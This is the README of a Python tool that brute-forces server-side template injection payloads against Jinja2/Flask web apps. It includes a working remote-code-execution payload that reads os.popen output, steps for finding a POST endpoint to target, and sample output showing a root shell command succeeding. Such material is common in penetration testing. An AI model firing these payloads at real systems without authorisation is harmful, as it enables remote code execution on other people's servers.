# 🍹 Ice-Ice-Tea-Ay!

**Ice-Ice-Tea-Ay** is a command-line tool written in Python to perform payload-based brute-force checks for **Server-Side Template Injection (SSTI)** vulnerabilities on Jinja2/Flask-based web applications.

---

## How it Works?
It works by injecting multiple crafted payloads and analyzing server responses to detect signs of SSTI, number evaluation, or even Remote Code Execution (RCE).

---
## Requirements
- pycurl
- requests

---

## Features

- Checks for **SSTI via numerical evaluation** (e.g., `{{64*64}}`)
- Detects **Remote Code Execution (RCE)** payloads (e.g., `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`)
- Multiple payload types: Jinja2, Freemarker, Velocity, Flask, etc.
- Supports custom POST body injection with a placeholder (`&x`)
- Uses `pycurl` for fast and raw HTTP requests

---

## Installation

```bash
git clone https://github.com/yourusername/ice-ice-tea-ay.git
cd ice-ice-tea-ay
pip install pycurl requests
```

---
## How to use
First you need to find an input in targeted website. Then open Developer Tools, go to Network tab, and try to fill with something then submit it. Check for any endpoint that uses "POST" method inside "Header" tab. Go to the "Payload" tab (on the left side of "Header" tab), click "View Source", copy the payload and use the endpoint in the script.

This is an example of use:
```bash
> python3 ice-ice-tea-ay.py

Ice-Ice-Tea-Ay!
A Brute-Force Tool to check SSTI vulnerability on Jinja2/Flask-based web servers.

Please put the URL target here: http://localhost:5000/login
Insert a header body (place '&x' inside the body): username=admin&password=&x
1. Number eval check 
2. Remote Code Execution (RCE) check 
3. Check all possible code 
Choose a number: 3
```
If the tools success find the payload, the output will look like this:
```bash
Found One!
Payload: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
Response:

                <!doctype html>
                <h1 style="font-size:100px;" align="center">uid=0(root) gid=0(root) groups=0(root)     
</h1>
```
